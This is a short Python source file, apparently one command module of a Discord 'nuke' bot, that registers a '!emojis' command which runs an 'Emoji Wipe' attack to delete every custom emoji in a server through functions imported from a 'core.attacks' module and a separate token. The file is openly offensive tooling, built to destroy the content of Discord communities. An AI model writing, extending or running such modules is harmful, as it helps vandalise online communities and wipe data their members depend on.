"""!emojis - wipe every custom emoji."""

import discord
from discord.ext import commands

from core import attacks
from .common import run_attack, token


class Emojis(commands.Cog):
    """wipe every custom emoji."""

    @commands.command(name="emojis")
    async def emojis(self, ctx: commands.Context):
        """wipe every custom emoji."""
        await run_attack(
            ctx, "Emoji Wipe",
            lambda g: attacks.wipe_emoji(token(), g.id))


async def setup(bot: commands.Bot):
    await bot.add_cog(Emojis())
